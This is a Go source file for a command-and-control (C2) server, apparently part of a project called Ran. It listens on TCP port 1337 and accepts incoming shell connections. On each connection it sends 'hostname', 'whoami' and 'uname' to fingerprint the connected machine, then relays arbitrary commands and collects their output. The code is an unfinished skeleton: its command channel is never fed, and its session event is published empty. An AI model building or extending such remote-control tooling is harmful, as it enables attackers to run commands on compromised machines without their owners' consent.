package c2

import (
	"context"
	"fmt"
	"net"

	bus "github.com/Magier/Ran/internal"
)

type C2Started struct {
}

func (c C2Started) EventName() string {
	return "c2 started"
}

type ListenerStarted struct {
	port int
}

func (c ListenerStarted) EventName() string {
	return fmt.Sprintf("listener started on port %d", c.port)
}

type SessionStarted struct {
	hostname string
	os       string
	user     string
}

func (c SessionStarted) EventName() string {
	return fmt.Sprintf("session started: [%s] %s@%s ", c.hostname, c.user, c.os)
}

func StartC2(mb bus.MessageBus) {
	go startListener(mb)
	err := mb.Publish(C2Started{})
	if err != nil {
		panic(err)
	}
}

func startListener(bus bus.MessageBus) {
	port := 1337
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer listener.Close()

	err = bus.Publish(ListenerStarted{port: port})
	if err != nil {
		fmt.Println("Error publishing listener event:", err)
	}

	for {
		// Accept incoming connections
		fmt.Print("wating for sb. to connect\n")
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		// bus.Publish()
		// Handle client connection in a goroutine
		in := make(chan string, 5)
		out := make(chan string, 5)
		go handleSession(ctx, conn, in, out)
		bus.Publish(SessionStarted{})
	}
}

func sendCommand(conn net.Conn, cmd string) (string, error) {
	raw_result := make([]byte, 1024)
	_, err := conn.Write([]byte(cmd))
	if err != nil {
		fmt.Println("Error reading from connection:", err)
		return "", err
	}
	n, err := conn.Read(raw_result)
	if err != nil {
		fmt.Println("Error reading from connection:", err)
		return "", err
	}
	result := string(raw_result[:n])
	fmt.Println("Result:", result)
	return result, nil
}

func handleSession(ctx context.Context, conn net.Conn, cmds <-chan string, results chan<- string) {
	defer conn.Close()

	hostname, err := sendCommand(conn, "hostname")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	results <- hostname

	user, err := sendCommand(conn, "whoami")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	results <- user

	os, err := sendCommand(conn, "uname")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	results <- os

	for {
		select {
		case <-ctx.Done():
			close(results)
			return
		default:
			fmt.Println("Ready for commands")
			cmd := <-cmds

			res, err := sendCommand(conn, cmd)
			if err != nil {
				fmt.Println("Error for ", cmd, ": ", err)
			}
			fmt.Println("Received data:", string(res))
			results <- res
		}
	}
}
